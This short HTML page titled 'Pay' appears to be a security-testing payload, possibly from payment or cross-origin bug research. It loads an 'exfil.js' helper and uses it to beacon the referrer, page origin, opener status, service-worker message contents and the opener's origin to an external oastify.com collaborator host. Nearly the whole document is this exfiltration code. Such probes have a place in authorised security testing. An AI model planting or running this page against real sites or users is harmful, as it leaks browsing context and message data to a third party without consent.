  <!DOCTYPE html>
  <html>
  <head><title>Pay</title></head>
  <body>
  <script src="shared/exfil.js"></script>
  <script>
  var exfil = Exfil.create('https://ua8bgofxi61ugvubb5h68nigu70yopce.oastify.com');

  exfil.beaconParams({
    loaded: 1,
    ref: document.referrer,
    opener: window.opener ? 'yes' : 'no',
    origin: location.origin
  });

  navigator.serviceWorker.addEventListener('message', function(e) {
    exfil.beaconParams({src: 'sw_msg', d: JSON.stringify(e.data)});
  });

  if (window.opener) {
    try {
      exfil.beaconParams({opener_origin: window.opener.location.origin});
    } catch(e) {
      exfil.beaconParams({opener_origin: 'cross-origin: ' + e.message});
    }
  }
  </script>
  </body>
  </html>
